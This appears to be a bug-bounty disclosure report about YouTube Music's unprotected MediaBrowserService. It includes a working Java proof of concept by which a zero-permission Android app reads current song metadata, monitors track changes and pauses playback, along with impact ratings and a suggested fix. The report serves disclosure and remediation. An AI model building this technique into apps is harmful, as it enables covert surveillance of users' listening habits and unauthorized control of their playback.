# VRP Report #40: YouTube Music Unprotected MediaBrowserService — Listening Activity Leak + Playback Control

## Summary
YouTube Music's `MusicBrowserService` is exported without any permission restriction. Any installed app can connect via the `MediaBrowser` API, obtain the `MediaSession` token, and monitor the user's music listening activity in real-time — including song titles, artists, albums, and playback state — without any permissions or user consent.

## Affected Component
| Attribute | Value |
|-----------|-------|
| App | YouTube Music |
| Package | `com.google.android.apps.youtube.music` |
| Component | `com.google.android.apps.youtube.music.mediabrowser.MusicBrowserService` |
| Type | Service (MediaBrowserService) |
| Exported | `true` |
| Permission | NONE |

## Systemic Issue
This is the same vulnerability class as VRP #39 (YouTube `MainAppMediaBrowserService`). Both YouTube apps expose their MediaBrowserService without caller validation:

| App | Service | Permission | Impact |
|-----|---------|-----------|--------|
| YouTube | MainAppMediaBrowserService | NONE | Video viewing leak |
| YouTube Music | MusicBrowserService | NONE | Music listening leak |

## Proof of Concept
```java
// Zero-permission app connects to YouTube Music's MediaBrowserService
MediaBrowser browser = new MediaBrowser(context,
    new ComponentName("com.google.android.apps.youtube.music",
        "com.google.android.apps.youtube.music.mediabrowser.MusicBrowserService"),
    new MediaBrowser.ConnectionCallback() {
        @Override
        public void onConnected() {
            MediaSession.Token token = browser.getSessionToken();
            MediaController ctrl = new MediaController(context, token);
            
            // LEAKED: Current song metadata
            MediaMetadata md = ctrl.getMetadata();
            String song = md.getString(MediaMetadata.METADATA_KEY_TITLE);
            String artist = md.getString(MediaMetadata.METADATA_KEY_ARTIST);
            
            // LEAKED: Real-time listening monitoring
            ctrl.registerCallback(new MediaController.Callback() {
                @Override
                public void onMetadataChanged(MediaMetadata md) {
                    // Notified every time user changes song
                }
            });
            
            // CONTROL: Can pause, play, skip without authorization
            ctrl.getTransportControls().pause();
        }
    }, null);
browser.connect();
```

## Impact

### Confidentiality (HIGH)
- Music listening habits are sensitive personal data (reveals mood, preferences, cultural background)
- Real-time monitoring of every song change
- Song title, artist, album, duration all exposed
- Combined with YouTube viewing leak (#39), builds comprehensive media consumption profile

### Integrity (MEDIUM)
- Unauthorized playback control (pause, play, skip, seek)

### Attack Complexity: LOW
- Zero permissions required
- Standard Android MediaBrowser API
- No user interaction needed

## Remediation
Add caller validation in `onGetRoot()` — reject connections from non-Google-signed packages, or add `android:permission` to the service declaration.

## Device / Build
- Pixel 6a, Android 17 (API 37), Build CP2A.260605.012
